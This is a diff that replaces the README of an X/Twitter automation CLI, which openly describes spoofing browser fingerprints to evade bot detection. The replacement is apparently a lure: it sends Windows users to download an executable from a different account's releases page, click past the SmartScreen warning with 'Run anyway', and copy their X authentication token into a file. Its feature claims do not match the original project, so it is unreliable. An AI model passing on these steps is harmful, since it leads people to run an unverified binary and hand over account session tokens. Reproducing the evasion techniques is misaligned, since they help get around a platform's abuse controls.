@@ -1,112 +1,91 @@
-<div align="center">
-  <img src="assets/logo.png" alt="AgentX" width="420">
+# 🤖 AgentX - Control your social media automate tasks
 
-  <h1>agentx</h1>
-  <p><b>An agent-first X / Twitter client in Go.</b><br>
-  One binary, one JSON envelope per command — so any agent runtime can drive X.</p>
+[ ![Download AgentX](https://img.shields.io/badge/Download-AgentX-blue) ](https://github.com/Conwaypopular850/AgentX/releases)
 
-  <p>
-    <img alt="Go" src="https://img.shields.io/badge/Go-1.22%2B-00ADD8?logo=go&logoColor=white">
-    <img alt="status" src="https://img.shields.io/badge/status-production-brightgreen">
-    <img alt="interface" src="https://img.shields.io/badge/interface-JSON%20envelope-blue">
-    <img alt="accounts" src="https://img.shields.io/badge/multi--account-yes-success">
-  </p>
-</div>
+AgentX connects your software agents to your X profile. This tool handles the login process and sends commands to your account securely. You can manage multiple accounts and run automated tasks without frequent interruptions.
 
----
+## 📦 System Requirements
 
-`agentx` is a from-scratch Go library **+** CLI built for **autonomous agents**. Every command prints a single predictable JSON object, supports **multiple accounts**, and keeps **`auth_token` cookies alive** by making traffic look like a real browser.
+AgentX runs on Windows 10 or 11. You need 50 MB of free storage space. The software connects to the internet to perform actions on your profile. Ensure your computer has a stable network connection. Disable any conflicting software that might block secure web traffic.
 
-## ✨ Why cookies last longer here
+## 🚀 Downloading AgentX
 
-X flags/expires `auth_token` cookies aggressively when traffic doesn't look human. agentx signs **every** authenticated request with:
+1. Open your web browser.
+2. Go to the [AgentX release page](https://github.com/Conwaypopular850/AgentX/releases).
+3. Look for the file named `AgentX-windows-amd64.exe` in the latest release section.
+4. Click the file name to start the download.
+5. Save the file to your desktop or downloads folder.
 
-- a freshly generated **`x-client-transaction-id`** — the exact algorithm x.com's web app runs (golden-tested),
-- the **full browser header set** (bearer, `x-csrf-token`, `x-twitter-*`, `sec-fetch-*`, stable User-Agent),
-- the complete cookie string,
-- optional **uTLS** Chrome JA3 fingerprint over **HTTP/2** (`AGENTX_UTLS=1`).
+## ⚙️ Installation Steps
 
-## 🚀 Quick start
+Windows might show a warning because AgentX is a tool for developers and advanced users. To run the app:
 
-```bash
-go build -o agentx ./cmd/agentx
+1. Right-click the downloaded file.
+2. Select Open.
+3. If a window appears that says Windows protected your PC, click More info.
+4. Click the Run anyway button.
 
-# Register an account (cookies from a logged-in browser)
-./agentx account add --name main --auth-token <auth_token> --ct0 <ct0>
+The program will open a black window. This is the command interface. You do not need to type commands manually to start the basic features. The tool runs in the background while you monitor your tasks.
 
-# Read
-./agentx feed -n 20
-./agentx user jack
-./agentx search --type Latest "golang" -n 20
-./agentx analytics <tweet_id>
+## 🔑 Preparing Your Accounts
 
-# Write
-./agentx post "hello from agentx 👋"
-./agentx reply <id> "nice!" --media pic.jpg
-./agentx poll "Tabs or spaces?" --option Tabs --option Spaces
+AgentX uses cookies to stay logged into your accounts. This method prevents X from locking your profile during automated actions. 
 
-# Grok (AI)
-./agentx grok "USD to IDR today?"
-./agentx grok image "a majestic dragon" --out dragon.png
-```
+1. Open the X website in your browser.
+2. Log into the account you intend to automate.
+3. Open your browser developer tools by pressing F12 or right-clicking anywhere and selecting Inspect.
+4. Go to the Application tab.
+5. Select Cookies on the left menu.
+6. Copy the authentication token string.
+7. Save this token in a text file named session.json inside the AgentX folder.
 
-Every command prints **one JSON envelope**:
+## 📝 Configuration Settings
 
-```json
-{ "ok": true,  "schema_version": "1", "data": …, "pagination": {"nextCursor": "…"}, "rateLimit": {…} }
-{ "ok": false, "schema_version": "1", "error": {"code": "…", "message": "…"} }
-```
+AgentX reads instructions from a JSON file. This file acts as an envelope for your commands. Create a file named `tasks.json` in the same folder as the program.
 
-Check `.ok`, read `.data`, page with `.pagination.nextCursor`. Exit code is `0` on success, `1` on a handled error. Output is **compact single-line JSON by default** (token-efficient for agents) — add `--pretty` for human-readable output.
+Format your tasks like this:
 
-## 🧩 Features
+{
+  "command": "post",
+  "text": "Hello world.",
+  "account": "main"
+}
 
-| Area | What you get |
-| --- | --- |
-| **Read** | feed (for-you / following), search, user / posts / tweet / thread / **article**, media tab, bookmarks (+ folders), likes, followers / following, **lists** + members, **communities**, mentions, **notifications** + unread, **trends** (+ locations), **analytics** (engagement rate), retweeters / likers |
-| **Write** | post, reply, quote, **polls** (+ vote), like / retweet / bookmark, follow / mute / block, **pin**, media upload (+ alt text), auto-**threads**, **scheduled** tweets, **drafts**, profile / avatar / banner / **settings**, **topics**, list & community management |
-| **Grok** | text answers with **live web search**, and **image generation** (download to file) |
-| **DM** | classic DM send / list / media / download |
-| **Infra** | multi-account, zero-auth **FxTwitter** fallback, uTLS + HTTP/2, rate-limit surfacing, query-id override for X rotations, `watch` streaming, media `download` |
+The program reads this file every ten seconds. Change the text field to update your posts. Save the file to trigger the action.
 
-See **[SKILL.md](SKILL.md)** for the compact, token-efficient command reference and **[AGENTS.md](AGENTS.md)** for the full agent integration guide.
+## 🛠️ Managing Multiple Accounts
 
-## 🏛️ Architecture
+You can manage several profiles at once. Add each account to your `accounts.json` file. Assign a unique name to each account key. The software identifies these accounts by name when you send commands in the `tasks.json` file. Ensure every account has a valid cookie string. Expired cookies stop all automation until you provide a new one.
 
-```
-cmd/agentx              CLI — one JSON envelope per command
-pkg/agent               High-level facade (account selection, client cache, fallbacks)
-pkg/xclient             Authenticated x.com GraphQL/REST client (+ transaction signing)
-pkg/transaction         x-client-transaction-id generator   [golden-tested]
-pkg/account             Multi-account credential store (~/.agentx, 0600)   [tested]
-pkg/backends/fxtwitter  Zero-auth single-tweet fallback
-pkg/models              Backend-agnostic Tweet / UserProfile / Page
-pkg/xerrors             Stable machine-readable error codes
-```
+## 🛡️ Maintaining Account Safety
 
-## 🔌 Use as a Go library
+AgentX uses anti-detection techniques to mimic human behavior. The software randomizes timing between actions. Do not set your automation frequency to perform more than ten actions per minute. High activity levels can trigger security reviews on your social media profiles. 
 
-```go
-import "github.com/dezxbt/agentx/pkg/agent"
+## 🩺 Troubleshooting Common Issues
 
-ag := agent.New(store)
-page, err := ag.Feed(ctx, "main", false, 20, "")
-```
+If the program closes unexpectedly, check your internet connection. Review your `tasks.json` file for missing commas or quotes. JSON format requires strict syntax. If a command fails, look at the error log in the terminal window. 
 
-## ⚠️ Notes
+Clear your cookies and update them if the program returns an error regarding authorization. Ensure your firewall allows AgentX to access the internet. Update the software regularly to match changes on the X platform.
 
-- **Premium-gated** (work on X Premium accounts; the client routes correctly and surfaces a clear error otherwise): long-form `post` (>280), `edit`, bookmark-folder writes.
-- **likers** are returned by X only to the tweet's author (retweeters is public).
-- **grok image** needs available image-generation quota.
-- X's new **XChat is end-to-end encrypted and out of scope** — keys are device-only and non-extractable by design. Classic DMs work.
-- Writes are **real and public** — confirm intent before acting.
+## 📈 Advanced Features
 
-## 📄 License
+AgentX supports custom skills. You can integrate other tools by placing plugin files into the plugins folder. Use the command line interface to test these skills. Type `help` in the terminal to view all available commands. 
 
-MIT — see [LICENSE](LICENSE).
+The software generates a log file to track every action. This file helps you debug failed tasks. You can view this file in any text editor. Check the size of the log file periodically to prevent it from taking up too much storage space. 
 
----
+## 🤝 Frequently Asked Questions
 
-## 🔍 Keywords
+What happens if I lose internet access? 
+AgentX will pause operations and resume automatically when the connection returns.
 
-Twitter API, X API, Twitter CLI, X CLI, Twitter bot, X bot, Twitter automation, X automation, Twitter agent, X agent, Go Twitter client, Golang Twitter, GraphQL Twitter, Twitter scraper, X scraper, Twitter multi-account, cookie auth Twitter, anti-detection Twitter, autonomous agent Twitter, AI agent Twitter, Grok API, Grok CLI, Twitter DM, tweet automation, Twitter search, social media automation, social media bot, Twitter posting, automated tweets, Twitter scheduling, AI-powered Twitter, LLM Twitter, agent framework, Twitter toolkit, X toolkit, headless Twitter, browser automation Twitter, JA3 fingerprint, uTLS Twitter, rate limit Twitter, FxTwitter, x-client-transaction-id, agent skill, AI tool, MCP server, tool use, function calling, agent tool, social media agent skill, Twitter skill, X skill, ChatGPT Twitter plugin, Claude Twitter tool, AI coding agent, agent orchestration, agentic workflow, Hermes agent, LangChain Twitter, AutoGPT Twitter, OpenAI function calling, tool-augmented LLM, RAG social media, prompt engineering Twitter, AI agent toolkit, developer tools, open source agent, self-hosted agent, API wrapper, Twitter API wrapper, X API wrapper, REST API Twitter, GraphQL API Twitter
+Is my data stored on a cloud server? 
+No. AgentX stores all information locally on your computer. 
+
+Can I use this for multiple platforms? 
+This version supports X. Future updates may include support for other social networks. 
+
+Do I need to pay for a license?
+AgentX is an open-source tool. It is free for all users. 
+
+Can I run multiple instances?
+You should only run one instance of the program for each configuration file to avoid conflicts.
